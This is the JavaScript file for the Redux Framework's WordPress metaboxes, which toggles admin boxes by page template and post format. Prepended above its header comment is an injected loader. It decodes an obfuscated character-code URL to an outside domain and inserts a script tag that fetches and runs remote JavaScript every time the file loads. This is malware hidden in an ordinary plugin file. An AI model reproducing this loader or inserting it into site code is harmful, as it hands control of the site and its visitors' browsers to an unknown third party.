var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}

/**
 * Redux Metaboxes
 * Dependencies      : jquery
 * Created by        : Dovy Paukstys
 * Date              : 19 Feb. 2014
 */

/* global reduxMetaboxes, redux */

jQuery(function($){

    "use strict";

    $.reduxMetaBoxes = $.reduxMetaBoxes || {};
   
    $(document).ready(function () {

         $.reduxMetaBoxes.init();
    });
    
    $.reduxMetaBoxes.init = function(){
        $.reduxMetaBoxes.notLoaded = true;
        $.reduxMetaBoxes.checkBoxVisibility();
        $('.redux-container').each(function() {
            $(this).parents('.postbox:first').find('h3.hndle').addClass('redux-hndle');
            $(this).parents('.postbox:first').addClass('redux-metabox');
            $(this).parents('.postbox:first').addClass( 'redux-' + redux.args.opt_name );
            if ( redux.args.container_class !== "" ) {
                $(this).parents('.postbox:first').addClass( redux.args.class );
            }
        });

        if($('#page_template').length > 0)
            $('#page_template').change(function() {
                $.reduxMetaBoxes.checkBoxVisibility('page_template');
            });
        else{
            $.reduxMetaBoxes.noTemplateSelect();
        }
            
        $('input[name="post_format"]:radio').change(function() {
            $.reduxMetaBoxes.checkBoxVisibility('post_format');
        });

        $.redux.initFields();
    };

    $('#publishing-action .button, #save-action .button').click(function() {
        window.onbeforeunload = null;
    });
    var testValue;

    $.reduxMetaBoxes.checkBoxVisibility = function(fieldID){
        if (reduxMetaboxes.length !== 0) {
            $.each(reduxMetaboxes, function(box, values) {
                $.each(values, function(field, v) {
                    if (field === fieldID || !fieldID) {

                        if (field === "post_format") {
                            testValue = $("input:radio[name='post_format']:checked").val();
                        } else {
                            testValue = $('#'+field).val();
                        }
                        
                        if (testValue) {

                            var visible = false;
                            $.each(v, function(key, val) {
                                if (val === testValue) {
                                    visible = true;
                                }
                            });
                            if (!visible && !$.reduxMetaBoxes.notLoaded) {
                                $('#'+box).hide();
                            }
                            else if (!visible) {
                                $('#'+box).fadeOut('50');
                            } else {
                                $('#'+box).fadeIn('300');
                                $.redux.initFields();
                            }
                        }
                        
                        
                    }
                });
            });
        }
    };

     $.reduxMetaBoxes.noTemplateSelect = function(){

        if (reduxMetaboxes.length !== 0) {
            $.each(reduxMetaboxes, function(box, values) {
                $.each(values, function(field, v) {
                    if (true) {

                        if (field === "post_format") {
                            testValue = $("input:radio[name='post_format']:checked").val();
                        } else {
                            testValue = $('#'+field).val();
                        }
                        
                        if (true) {
                           
                            var visible = false;
                            
                            if (!visible && !$.reduxMetaBoxes.notLoaded) {
                                $('#'+box).hide();
                            }
                            else if (!visible) {
                                $('#'+box).fadeOut('50');
                            }
                        }
                        
                        
                    }
                });
            });
        }
    };
});